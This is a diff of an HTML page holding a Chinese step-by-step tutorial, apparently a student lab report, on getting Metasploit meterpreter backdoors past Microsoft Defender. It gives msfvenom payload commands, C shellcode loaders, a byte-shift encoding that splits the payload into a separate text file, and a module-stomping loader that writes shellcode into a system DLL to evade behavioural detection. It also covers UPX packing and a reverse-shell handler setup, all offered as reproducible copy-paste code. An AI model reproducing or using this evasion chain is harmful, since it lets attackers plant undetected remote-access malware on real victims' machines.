@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>免杀原理与实践：组件分离绕过 Defender 静态查杀（0基础可复现）</title>
+<title>{TITLE}</title>
 <style>
 :root { --ink:#1c1e26; --sub:#5a5f73; --line:#d8dbe4; --brand:#0b5bd3; --codebg:#f4f4f8; }
 * { box-sizing: border-box; }
@@ -24,6 +24,19 @@ strong { color:#0d2a66; }
 blockquote { margin:14px 0; padding:10px 16px; background:#f7f8fa; border-left:4px solid #b9c2d8;
   color:#3c4152; font-size:15px; }
 blockquote p { margin:4px 0; }
+.codewrap { position:relative; }
+.codewrap pre { margin:14px 0; }
+.copybtn { position:absolute; top:10px; right:10px; z-index:5; opacity:0; pointer-events:none;
+  background:#2a2c38; color:#cfd2e0; border:1px solid #3c3f4f; border-radius:6px;
+  font:12.5px/1 "Microsoft YaHei",sans-serif; padding:5px 12px; cursor:pointer; transition:opacity .15s; }
+.codewrap:hover .copybtn { opacity:1; pointer-events:auto; }
+.copybtn:hover { background:#3a3d4d; color:#fff; }
+.copybtn.ok { color:#7ee787; border-color:#2ea043; }
+#lightbox { position:fixed; inset:0; display:none; z-index:99; background:rgba(10,12,20,.86);
+  align-items:center; justify-content:center; cursor:zoom-out; }
+#lightbox.on { display:flex; }
+#lightbox img { max-width:94vw; max-height:94vh; border-radius:8px; box-shadow:0 8px 40px rgba(0,0,0,.5); }
+#lightbox .tip { position:fixed; bottom:18px; left:0; right:0; text-align:center; color:#aab; font-size:13px; }
 pre { background:#16161f; color:#e8e8f0; padding:16px 18px; border-radius:10px; overflow-x:auto;
   font:13.5px/1.75 "Cascadia Code",Consolas,"JetBrains Mono",monospace; margin:14px 0; }
 code { font-family:Consolas,"JetBrains Mono",monospace; }
@@ -115,11 +128,11 @@ figcaption { font-size:13.5px; color:var(--sub); margin-top:8px; text-align:cent
 <tr><td>行为检测</td><td>运行时</td><td>动作序列（申请可执行内存、外连、注入）</td><td>减少暴露恶意动作——<strong>最难过的一关</strong></td></tr>
 </tbody></table></div>
 <p>据此，本实验设计了一条由易到难的<strong>五级样本演进路线</strong>，每一级都用 Defender 实测生死：</p>
-<pre data-lang="text"><code>第0级  msfvenom 裸 exe          → 预期：落盘即杀（公开模板，特征库全收录）
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="text"><code>第0级  msfvenom 裸 exe          → 预期：落盘即杀（公开模板，特征库全收录）
 第1级  + msf 编码器变形          → 预期：仍杀（模板和解码存根才是特征）
 第2级  C + shellcode 自编程序    → 预期：仍杀（shellcode 字节特征已成熟）
 第3级  + UPX 加壳               → 预期：仍杀（知名壳特征已收录 + 高熵启发式）
-第4级  组件分离 + 私有加密       → 预期：静态 0 威胁，运行回连成功</code></pre>
+第4级  组件分离 + 私有加密       → 预期：静态 0 威胁，运行回连成功</code></pre></div>
 <p>前四级是“对照组”，它们的牺牲换来最有说服力的基线；第五级是本文的主角。</p>
 <h2 id="sec3"><span class="hn">三、</span>实验环境</h2>
 <p>A、B 两人各自搭建了一套独立环境，方法在两套环境里都完整跑通。本文以 <strong>A 环境</strong>的截图贯穿五级演进与附加题；B 环境在模块踩踏、传输纪律与行为层对抗上补强，相应小节均以 B 标注：</p>
@@ -133,9 +146,9 @@ figcaption { font-size:13.5px; color:var(--sub); margin-top:8px; text-align:cent
 </tbody></table></div>
 <p>B 环境实测的杀软版本信息（按要求注明）：Microsoft Defender 防病毒，AMProductVersion <strong>4.18.26080.4</strong>，病毒特征库 <strong>1.459.501.0</strong>，引擎 <strong>1.1.26080.3</strong>；Windows 11 24H2+（内核 10.0.26100）。该机另预装联想电脑管家 5.1.200.8201，手动查杀同样未发现免杀样本（第二杀软交叉验证）。</p>
 <p>Kali 侧一次性装好工具并建工作目录：</p>
-<pre data-lang="bash"><code># mingw-w64：在 Linux 上交叉编译 Windows exe；upx-ucl：加壳器
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># mingw-w64：在 Linux 上交叉编译 Windows exe；upx-ucl：加壳器
 sudo apt update &amp;&amp; sudo apt install -y mingw-w64 upx-ucl
-mkdir -p ~/exp3 &amp;&amp; cd ~/exp3</code></pre>
+mkdir -p ~/exp3 &amp;&amp; cd ~/exp3</code></pre></div>
 <p>Windows 侧建好工作目录，并把 Windows 版 <code>socat.exe</code> 放入 <code>C:\Tools\</code>（socat 在 Kali 自带，Windows 版需单独获取，课程资料包内有）。</p>
 <p><strong>Kali 里的文件怎么到 Windows？两种都行，本文两人各用了一种</strong>：</p>
 <ul>
@@ -146,10 +159,10 @@ mkdir -p ~/exp3 &amp;&amp; cd ~/exp3</code></pre>
 <p>联通检测：Kali <code>ping</code> 宿主机、宿主机 <code>ping</code> Kali 双向各来一次，0% 丢包即可开工。注意<strong>宿主机有两个地址</strong>（物理网卡 + VMnet8），任选能通的即可；即使 Windows 防火墙不放行 ICMP 也不影响后续——所有实际连接都是 Windows 主动连向 Kali（后门回连的本质就是“靶机主动打电话给攻击机”）。</p>
 <h2 id="sec4"><span class="hn">四、</span>第 0/1 级对照组：msfvenom 裸 exe 与编码器变形</h2>
 <h3><span class="hn">（一）</span>裸 exe（第 0 级）</h3>
-<pre data-lang="bash"><code># -p 指定载荷：windows/meterpreter/reverse_tcp
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># -p 指定载荷：windows/meterpreter/reverse_tcp
 # LHOST：回连地址（填 Kali 的 IP）；LPORT：回连端口
 # -f exe：输出 Windows 可执行文件；-o：输出文件名
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 -f exe -o 你的学号_base.exe</code></pre>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 -f exe -o 你的学号_base.exe</code></pre></div>
 <blockquote><strong>LHOST / LPORT 每台电脑都不一样</strong>：LHOST 填你自己 Kali 的 IP（即占位符 <code>你的Kali_IP</code>，用 <code>hostname -I</code> 查询）；LPORT 原则上<strong>任意未被占用的端口都行</strong>，本文用 443 只是借它伪装成 HTTPS 流量、更容易穿过防火墙的出站规则——你用 4444、8443 都可以，只要<strong>生成载荷、起 handler、（附加题的）端口转发三处保持一致</strong>。</blockquote>
 <p>生成 payload 355 字节、成品 exe 7168 字节。拷入 Windows 后 Defender <strong>落盘即杀</strong>：</p>
 <div class="carousel">
@@ -159,9 +172,9 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 -f exe
 </div>
 <div class="cap">图1 基线裸 exe“落地即杀”（左右滑动对比 A/B 两环境）——① A 环境：msfvenom 生成 20242110_base.exe，13:51 被检出 Trojan:Win32/Meterpreter.RPZ!MTB（严重）；② B 环境：生成 L0_msf.exe（payload 566 字节/exe 7680 字节）；③ B 环境：对照组弹窗（22:48，L0/L1 同杀） <span class="hint">（块内可左右滑动）</span></div>
 <h3><span class="hn">（二）</span>编码器叠代 15 次（第 1 级）</h3>
-<pre data-lang="bash"><code># -e 指定编码器 shikata_ga_nai；-i 15：叠代 15 次；-b &#x27;\x00&#x27;：剔除空字节
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># -e 指定编码器 shikata_ga_nai；-i 15：叠代 15 次；-b &#x27;\x00&#x27;：剔除空字节
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 \
-  -e x86/shikata_ga_nai -i 15 -b &#x27;\x00&#x27; -f exe -o 你的学号_enc.exe</code></pre>
+  -e x86/shikata_ga_nai -i 15 -b &#x27;\x00&#x27; -f exe -o 你的学号_enc.exe</code></pre></div>
 <p>payload 经 15 轮迭代由 355 字节膨胀至 760 字节。Defender <strong>仍以完全相同的特征名检出</strong>：</p>
 <div class="carousel">
 <figure class="slide"><span class="tag">1</span><img src="img/fig02.png" alt="slide1" loading="lazy"></figure>
@@ -170,8 +183,8 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 \
 <div class="cap">图2 编码器叠代改不了结局（左右滑动）——① A 环境：shikata_ga_nai 编码 15 次生成 20242110_enc.exe，13:54 检出，特征名与图1 一字不差；② B 环境：编码 10 次生成 L1_enc.exe（payload 638→881 字节，exe 仍是 7680 字节） <span class="hint">（块内可左右滑动）</span></div>
 <p><strong>编码器免杀在 2026 年已经失效</strong>。原因藏在数字里：密文完全变形了（355→760 字节），但成品 exe 的结构与体积由模板决定——AV 盯的是 shikata 的<strong>解码器 stub</strong> 与 msfvenom 的 <strong>PE 模板</strong>，与编码次数无关。</p>
 <h3><span class="hn">（三）</span>jar 格式（实验要求：生成如 jar 之类的其他文件）</h3>
-<pre data-lang="bash"><code># msfvenom 也能产出其他平台格式，这里生成 Java 载荷
-msfvenom -p java/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 -f jar -o 你的学号_backdoor.jar</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># msfvenom 也能产出其他平台格式，这里生成 Java 载荷
+msfvenom -p java/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 -f jar -o 你的学号_backdoor.jar</code></pre></div>
 <div class="carousel">
 <figure class="slide"><span class="tag">1</span><img src="img/fig03.png" alt="slide1" loading="lazy"></figure>
 <figure class="slide"><span class="tag">2</span><img src="img/fig03b.png" alt="slide2" loading="lazy"></figure>
@@ -182,11 +195,11 @@ msfvenom -p java/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 -f jar -o
 <blockquote><strong>B 环境交叉验证</strong>：用 reverse_https 生成同样的三级样本，结果一致——裸 exe（payload 566 字节/exe 7680 字节）与编码 10 次版（payload 638→881 字节，<strong>exe 仍是 7680 字节</strong>）落盘即杀，同样特征 <code>Trojan:Win32/Meterpreter.RPZ!MTB</code>；jar（6289 字节）被隔离（VirTool:Java/Meterpreter.A）。两台机器、两种传输层、三种格式，全灭——<strong>公开工具的生成物早已是杀软特征库的一部分</strong>。</blockquote>
 <h2 id="sec5"><span class="hn">五、</span>第 2 级：C + shellcode 半手工——把载荷藏进自己的程序</h2>
 <p>编码器失效，那就抛开 msfvenom 的 exe 模板，<strong>自己写程序</strong>：先用 msfvenom 把载荷输出成 C 语言字节数组，再自己写加载器执行。</p>
-<pre data-lang="bash"><code># -f c：输出为 C 数组格式；shikata_ga_nai 编码 3 次
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># -f c：输出为 C 数组格式；shikata_ga_nai 编码 3 次
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 \
-  -e x86/shikata_ga_nai -i 3 -b &#x27;\x00&#x27; -f c -o shellcode.c</code></pre>
+  -e x86/shikata_ga_nai -i 3 -b &#x27;\x00&#x27; -f c -o shellcode.c</code></pre></div>
 <p>加载器 <code>cs.c</code> 的核心只有四步——<strong>申请内存 → 拷入 → 起线程执行</strong>：</p>
-<pre data-lang="c"><code>unsigned char buf[] = &quot;/* msfvenom -f c 输出的字节数组，此处省略 */&quot;;
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="c"><code>unsigned char buf[] = &quot;/* msfvenom -f c 输出的字节数组，此处省略 */&quot;;
 
 int main(void) {
     void *execMem = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT,
@@ -197,16 +210,16 @@ int main(void) {
         (LPTHREAD_START_ROUTINE)execMem, NULL, 0, NULL);    /* ③ 起线程让它跑起来 */
     WaitForSingleObject(thread, INFINITE);                  /* ④ 等它执行完 */
     return 0;
-}</code></pre>
+}</code></pre></div>
 <figure><img src="img/fig04.png" alt="图4 A 环境：shellcode.c 字节数组与自编 cs"><figcaption>图4 A 环境：shellcode.c 字节数组与自编 cs.c 加载器源码（VirtualAlloc + memcpy + CreateThread）</figcaption></figure>
-<pre data-lang="bash"><code># i686-w64-mingw32-gcc：编译出 32 位 Windows exe 的交叉编译器
-i686-w64-mingw32-gcc cs.c -o 你的学号_cs.exe</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># i686-w64-mingw32-gcc：编译出 32 位 Windows exe 的交叉编译器
+i686-w64-mingw32-gcc cs.c -o 你的学号_cs.exe</code></pre></div>
 <p>扫描结果：<strong>Defender 仍检出同一特征名 <code>Trojan:Win32/Meterpreter.RPZ!MTB</code></strong>（14:25）。</p>
 <figure><img src="img/fig05.png" alt="图5 A 环境：自编的 cs.exe 照样被检出（14:25"><figcaption>图5 A 环境：自编的 cs.exe 照样被检出（14:25），操作选项直接给出“隔离”</figcaption></figure>
 <p><strong>为什么还是死？</strong> 藏进了自己的程序，但 shellcode 的<strong>字节本身</strong>没变——2026 年的 Defender 对 meterpreter shellcode 字节特征的识别已经成熟。只要恶意字节还完整地躺在文件里，静态查杀总有办法命中。</p>
 <h2 id="sec6"><span class="hn">六、</span>第 3 级：UPX 加壳——老牌壳也是“知名特征”</h2>
 <p>给 cs.exe 套上 UPX 壳（<code>-o</code> 输出成新文件，保留原版）：</p>
-<pre data-lang="bash"><code>upx 你的学号_cs.exe -o 你的学号_cs_upx.exe</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>upx 你的学号_cs.exe -o 你的学号_cs_upx.exe</code></pre></div>
 <figure><img src="img/fig06.png" alt="图6 A 环境：UPX 压缩 cs.exe 成功，11001"><figcaption>图6 A 环境：UPX 压缩 cs.exe 成功，110018 → 60866 字节（压缩比 55.32%）；同一屏可见 -f c 生成、vim 编写、gcc 编译全链</figcaption></figure>
 <blockquote><strong>实测坑：<code>CantPackException: section size problem</code></strong>。UPX 4.2.4 直接对 msfvenom 模板生成的 exe（如 base 版）会报这个错——msf 模板的 PE 节表不规整，不满足 UPX 4.x 的检查。<strong>解决：把加壳对象换成 mingw 编译的 exe（PE 结构规整）</strong>。</blockquote>
 <p>加壳结果：<strong>仍被检出，而且详情里明确标注了 <code>→(UPX)</code></strong>（14:28）。</p>
@@ -226,27 +239,27 @@ i686-w64-mingw32-gcc cs.c -o 你的学号_cs.exe</code></pre>
 <h2 id="sec7"><span class="hn">七、</span>第 4 级（终态方案）：组件分离 + 私有加密</h2>
 <h3><span class="hn">（一）</span>核心思想：把恶意字节拆出去</h3>
 <p>把后门拆成两个“各自无害”的文件：</p>
-<pre data-lang="text"><code>┌─────────────────┐         ┌──────────────────┐
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="text"><code>┌─────────────────┐         ┌──────────────────┐
 │  encoded.txt    │         │  loader.exe      │
 │  纯十六进制文本  │  运行时  │  只有通用 API 调用 │
 │  （逐字节+1加密） │ ──────→ │  读文本→解密→执行  │
 │  杀软眼里：普通文本│  内存中  │  杀软眼里：普通小程序│
 └─────────────────┘  合体    └──────────────────┘
       两份“无害”的文件，直到运行那一刻才在内存里合体
-      —— 而静态扫描只看文件，看不到内存</code></pre>
+      —— 而静态扫描只看文件，看不到内存</code></pre></div>
 <ul>
 <li><code>encoded.txt</code>：载荷逐字节 +1 加密后转成十六进制<strong>文本</strong>。杀软不会对 txt 报毒，且内容已“变脸”，熵值也低（逐字节 +1 属于轻加密，不会像 AES 那样触发高熵启发式）；</li>
 <li><code>loader.exe</code>：只有 <code>fopen</code>/<code>VirtualAlloc</code>/<code>memcpy</code>/<code>CreateThread</code> 这类通用 API 调用，<strong>文件里不含任何载荷字节</strong>，静态扫描无特征可匹配。</li>
 </ul>
 <h3><span class="hn">（二）</span>生成加密载荷</h3>
-<pre data-lang="bash"><code># ① -f raw：输出最原始的裸 shellcode（不带任何模板）
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># ① -f raw：输出最原始的裸 shellcode（不带任何模板）
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的Kali_IP LPORT=443 -f raw -o sc.raw
 
 # ② 逐字节 +1 加密并转十六进制文本（perl 一行流）
 perl -e &#x27;binmode STDIN; binmode STDOUT; while (read(STDIN,$b,1)) { printf &quot;%02x&quot;, (ord($b)+1) % 256 }&#x27; &lt; sc.raw &gt; encoded.txt
 
 # ③ 完整性铁律：加密文本字节数必须恰为 raw 的 2 倍，否则就是加密损坏
-wc -c sc.raw encoded.txt    # 应输出 355 / 710——恰好 2 倍</code></pre>
+wc -c sc.raw encoded.txt    # 应输出 355 / 710——恰好 2 倍</code></pre></div>
 <div class="carousel">
 <figure class="slide"><span class="tag">1</span><img src="img/fig08.png" alt="slide1" loading="lazy"></figure>
 <figure class="slide"><span class="tag">2</span><img src="img/fig08b.png" alt="slide2" loading="lazy"></figure>
@@ -255,13 +268,13 @@ wc -c sc.raw encoded.txt    # 应输出 355 / 710——恰好 2 倍</code></pre>
 <blockquote><strong>实测坑 1：<code>% 256</code> 必须写！</strong> 载荷里的 0xFF 字节 +1 后若不取模，<code>printf "%02x"</code> 会输出三字符 “100”，把整个文件写坏——loader 解出垃圾代码、CreateThread 一执行就闪退，排查走了大弯路。加密端与解密端（loader 里的 <code>-1</code>）必须严格互逆。</blockquote>
 <blockquote><strong>实测坑 2：LHOST 必须是 Kali 当前 IP。</strong> 图8 顶部那次“生成成功”其实是废品——占位符没替换，这种载荷运行时永远连不回来（真实踩坑现场见「踩坑实录」一节）。</blockquote>
 <h3><span class="hn">（三）</span>加载器：最小可用版（A 的主线方案）</h3>
-<pre data-lang="c"><code>#include &lt;windows.h&gt;
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="c"><code>#include &lt;windows.h&gt;
 #include &lt;stdio.h&gt;
 #define MAX_LEN 4096
 unsigned char buf[MAX_LEN];
 
 int main(void) {
-    FILE *fp = fopen(&quot;encoded.txt&quot;, &quot;r&quot;);        /* ① 只读&quot;无害&quot;的文本，文件里没有恶意字节 */
+    FILE *fp = fopen(&quot;encoded.txt&quot;, &quot;r&quot;);        /* ① 只读“无害”的文本，文件里没有恶意字节 */
     if (fp == NULL) return 1;
     int i = 0; unsigned int ch;
     while (i &lt; MAX_LEN &amp;&amp; fscanf(fp, &quot;%2x&quot;, &amp;ch) == 1)
@@ -276,8 +289,8 @@ int main(void) {
     WaitForSingleObject(thread, INFINITE);
     CloseHandle(thread); VirtualFree(execMem, 0, MEM_RELEASE);
     return 0;
-}</code></pre>
-<pre data-lang="bash"><code>i686-w64-mingw32-gcc loader.c -o 你的学号_loader.exe</code></pre>
+}</code></pre></div>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>i686-w64-mingw32-gcc loader.c -o 你的学号_loader.exe</code></pre></div>
 <p>这个版本能过静态、能回连（「运行层」一节实测成功），但它有一个行为层软肋：<code>VirtualAlloc(PAGE_EXECUTE_READWRITE)</code> <strong>一次申请 RWX 私有内存</strong>，正是行为引擎重点盯防的申请模式。</p>
 <blockquote><strong>实测对照，也是给你的排错提示</strong>：这套最简思路在 A 环境一路绿灯——静态 0 威胁、reverse_tcp 稳定回连；但 B 用同样的组件分离 + reverse_tcp 组合，在 B 环境却被运行时拦杀（B 的系统策略更严格，经过见「行为层才是真正的对手」一节）。<strong>如果你复刻时静态扫描过了、运行却被杀，不妨试试下一小节 B 的模块踩踏版；还不行就按后文换传输层。</strong></blockquote>
 <h3><span class="hn">（四）</span>进阶：模块踩踏版（B 的强化方案）</h3>
@@ -287,7 +300,7 @@ int main(void) {
 <li>② 把解密后的代码写进<strong>已加载系统 DLL（msacm32.dll）的 .text 段</strong>再跳转——执行内存有文件映射背书，避开“私有可执行内存”这一行为特征；</li>
 <li>③ 写入用 RW、写完 <code>VirtualProtect</code> 改 RX，<strong>避免 RWX 一次到位</strong>的申请模式。</li>
 </ul>
-<pre data-lang="c"><code>#include &lt;windows.h&gt;
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="c"><code>#include &lt;windows.h&gt;
 #include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 #define MAX_LEN 4096
@@ -305,7 +318,7 @@ static LPVOID FindTextRange(HMODULE hMod, SIZE_T need) {          // 在已加�
 }
 
 int main(void) {
-    FILE *fp = fopen(&quot;encoded.txt&quot;, &quot;r&quot;);                          // 只读&quot;无害&quot;的文本
+    FILE *fp = fopen(&quot;encoded.txt&quot;, &quot;r&quot;);                          // 只读“无害”的文本
     if (fp == NULL) return 1;
     int i = 0; unsigned int ch;
     while (i &lt; MAX_LEN &amp;&amp; fscanf(fp, &quot;%2x&quot;, &amp;ch) == 1)
@@ -329,37 +342,37 @@ int main(void) {
     if (t == NULL) return 1;
     WaitForSingleObject(t, INFINITE);
     return 0;
-}</code></pre>
+}</code></pre></div>
 <p>x64 变体 <code>你的学号exp64.c</code> 仅一处不同：<code>fopen("encoded64.txt", "r")</code>，其余完全一致。多做一个 x64 变体不是重复劳动——它验证的是<strong>模块踩踏这套手法对 64 位 PE 同样成立</strong>（.text 段定位与 RW→RX 流程在 x64 结构下依然有效），也是第十节“UPX 加壳版回连”闭环的前提；实际攻防里 64 位目标才是主流，只做 x86 会把方法的有效性锁死在旧场景。B 环境对两个变体分别编译（x64 版带 <code>-static</code> 静态链接）：</p>
-<pre data-lang="bash"><code>i686-w64-mingw32-gcc 你的学号exp.c   -o 你的学号exp.exe              # x86 主线
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>i686-w64-mingw32-gcc 你的学号exp.c   -o 你的学号exp.exe              # x86 主线
 x86_64-w64-mingw32-gcc 你的学号exp64.c -o 你的学号exp64.exe -static  # x64 变体
-ls -l *.exe *.raw *.txt</code></pre>
+ls -l *.exe *.raw *.txt</code></pre></div>
 <p>注意：x86 版 <code>你的学号exp.exe</code> 可直接复用 6.2 生成的 <code>encoded.txt</code>（加载器与载荷格式无关）；而 <strong>x64 版读的是 <code>encoded64.txt</code>，必须单独生成</strong>，B 的命令如下（载荷用 reverse_https，与 B 的传输层一致，所以体积比主线的 tcp 版大）：</p>
-<pre data-lang="bash"><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=你的Kali_IP LPORT=443 -f raw -o sc64.raw
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=你的Kali_IP LPORT=443 -f raw -o sc64.raw
 perl -e &#x27;binmode STDIN; binmode STDOUT; while (read(STDIN,$b,1)) { printf &quot;%02x&quot;, (ord($b)+1) % 256 }&#x27; &lt; sc64.raw &gt; encoded64.txt
-wc -c sc64.raw encoded64.txt    # 应输出 841 / 1682——恰好 2 倍</code></pre>
+wc -c sc64.raw encoded64.txt    # 应输出 841 / 1682——恰好 2 倍</code></pre></div>
 <figure><img src="img/fig09.png" alt="图9 B 环境：x86/x64 两个踩踏版加载器编译完成，产"><figcaption>图9 B 环境：x86/x64 两个踩踏版加载器编译完成，产物清单里加密文本（1080/1682 字节）恰好都是 raw（540/841 字节）的 2 倍（B 的载荷是 https 版，比主线的 tcp 版大）</figcaption></figure>
 <h3><span class="hn">（五）</span>UPX 压缩加载器</h3>
 <p>加壳对象选<strong>自编译的加载器</strong>（前文说过，UPX 对 msfvenom 模板 PE 不兼容）：</p>
-<pre data-lang="bash"><code>cp 你的学号exp64.exe 你的学号exp64_upx.exe &amp;&amp; upx 你的学号exp64_upx.exe
-upx -l 你的学号exp64_upx.exe    # 复核压缩信息</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>cp 你的学号exp64.exe 你的学号exp64_upx.exe &amp;&amp; upx 你的学号exp64_upx.exe
+upx -l 你的学号exp64_upx.exe    # 复核压缩信息</code></pre></div>
 <figure><img src="img/fig10.png" alt="图10 B 环境：UPX 压缩踩踏版 x64 加载器成功，3"><figcaption>图10 B 环境：UPX 压缩踩踏版 x64 加载器成功，350906 → 182970 字节，为原体积的 52.14%（win64/pe）</figcaption></figure>
 <blockquote><strong>为什么会出现两次 UPX 实验？</strong> 它们回答的是两个不同的问题：第五节 A 给 <strong>cs.exe（内嵌载荷）</strong> 加壳，验证“加壳能不能救活必死样本”——不能，照样被抓；这里 B 给<strong>不含载荷的踩踏版加载器</strong>加壳，验证“加壳能不能与组件分离叠加”——能，且压缩到 52.14% 后功能完好（运行层闭环见「加壳版加载器的运行层验证」一节）。</blockquote>
 <p>加壳是否影响加载器功能、加壳版能否照常回连，「加壳版加载器的运行层验证」一节专门验证。</p>
 <h2 id="sec8"><span class="hn">八、</span>传输到靶机：tar + socat + MD5 校验（B 环境）</h2>
 <blockquote><strong>谁需要这一节？</strong> 按 A 的方式用共享文件夹操作的读者，文件已经直接落在 Windows 里，<strong>本节可跳过</strong>；在 Kali 家目录生成文件的读者（B 的方式）才需要下面的 tar + socat 传输。</blockquote>
 <p>一个 tar 包带走全部 8 个产物（对照组 3 个 + 组合免杀组 5 个，文件名按第三节主线的命名；B 的原始截图里叫 L0_msf.exe / L1_enc.exe / reverse.jar，是同样三个东西），Kali 先监听，Windows 再连入：</p>
-<pre data-lang="bash"><code># Kali：打包 + MD5 基线 + 启动监听（15 秒连接窗口）
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># Kali：打包 + MD5 基线 + 启动监听（15 秒连接窗口）
 tar czf exp3.tgz 你的学号_base.exe 你的学号_enc.exe 你的学号_backdoor.jar 你的学号exp.exe 你的学号exp64.exe 你的学号exp64_upx.exe encoded.txt encoded64.txt
 md5sum exp3.tgz                   # 7f9806cee83eb63ace87c4b48c44d6d6
-timeout 15 nc -lvnp 9999 &lt; exp3.tgz</code></pre>
+timeout 15 nc -lvnp 9999 &lt; exp3.tgz</code></pre></div>
 <figure><img src="img/fig11.png" alt="图11 B 环境：tar 打包 8 个产物、MD5 基线、n"><figcaption>图11 B 环境：tar 打包 8 个产物、MD5 基线、nc 监听并等到 Windows 连入（来自 192.168.96.1）</figcaption></figure>
-<pre data-lang="powershell"><code># Windows：在 Kali 监听后的 15 秒内回车（socat 在这里是客户端，Kali 未监听时连接会被拒绝）
-C:\Tools\socat.exe -u TCP:你的Kali_IP:9999 - &gt; C:\你的学号lab3\exp3.tgz</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="powershell"><code># Windows：在 Kali 监听后的 15 秒内回车（socat 在这里是客户端，Kali 未监听时连接会被拒绝）
+C:\Tools\socat.exe -u TCP:你的Kali_IP:9999 - &gt; C:\你的学号lab3\exp3.tgz</code></pre></div>
 <figure><img src="img/fig12.png" alt="图12 B 环境：Windows 侧 socat 接收写入 "><figcaption>图12 B 环境：Windows 侧 socat 接收写入 exp3.tgz</figcaption></figure>
-<pre data-lang="powershell"><code>certutil -hashfile C:\你的学号lab3\exp3.tgz MD5       # 与 Kali 端一致 = 传输无损
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="powershell"><code>certutil -hashfile C:\你的学号lab3\exp3.tgz MD5       # 与 Kali 端一致 = 传输无损
 tar -xzf C:\你的学号lab3\exp3.tgz -C C:\你的学号lab3
-dir C:\你的学号lab3</code></pre>
+dir C:\你的学号lab3</code></pre></div>
 <figure><img src="img/fig13.png" alt="图13 B 环境：certutil 校验 MD5 与 Kal"><figcaption>图13 B 环境：certutil 校验 MD5 与 Kali 端一致；解包后 dir——注意 L0_msf.exe / L1_enc.exe 已不在列表（落盘即被隔离），reverse.jar（22:42 落盘）还在</figcaption></figure>
 <blockquote><strong>实测坑：socat 连不上？</strong> socat 在这一步是<strong>客户端</strong>，必须 Kali 先 <code>nc -lvnp</code> 监听（注意 <code>timeout 15</code> 的 15 秒窗口）再在 Windows 回车。另外 PowerShell 运行当前目录程序要加 <code>.\</code> 前缀。</blockquote>
 <h2 id="sec9"><span class="hn">九、</span>放榜时刻：对照组全灭，免杀组 0 威胁</h2>
@@ -372,21 +385,21 @@ dir C:\你的学号lab3</code></pre>
 <blockquote><strong>jar 为什么“多活了”几分钟？</strong> B 环境的时间线是：22:42 前后解包落盘 → 22:48 对照组 exe 弹窗 → 22:49 jar 遭隔离——jar 并没有逃过检测，只是排在队列后段。对比 A 环境（文件经共享文件夹写入，检出与写入发生在同一分钟）可知：实时保护的触发时机（写入即扫、访问触发、空闲扫描）与云查杀回调存在时间差，而 jar 归档还要先展开内部 class 结构、分析开销更大，自然更慢。<strong>“晚杀”不等于“没杀”——反过来，防御方同样不能指望“落盘即报”永远即时。</strong></blockquote>
 <h2 id="sec10"><span class="hn">十、</span>运行层：443 端口回连拿权限</h2>
 <p>静态过了，还要能跑。Kali 起监听（handler 的载荷、端口必须与生成时完全一致）：</p>
-<pre data-lang="bash"><code># A 环境主线：reverse_tcp 443（handler 载荷/端口必须与生成时一致）
-msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 你的Kali_IP; set LPORT 443; run&quot;</code></pre>
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code># A 环境主线：reverse_tcp 443（handler 载荷/端口必须与生成时一致）
+msfconsole -q -x &quot;use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST 你的Kali_IP; set LPORT 443; run&quot;</code></pre></div>
 <p>也可以把监听配置存成资源脚本，一行起监听（失败排查时特别好用）：</p>
-<pre data-lang="bash"><code>cat &gt; 你的学号_handler.rc &lt;&lt;&#x27;EOF&#x27;
+<div class="codewrap"><button class="copybtn" type="button">复制</button><pre data-lang="bash"><code>cat &gt; 你的学号_handler.rc &lt;&lt;&#x27;EOF&#x27;
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 443
 exploit -j
 EOF
-msfconsole -q -r 你的学号_handler.rc</code></pre>
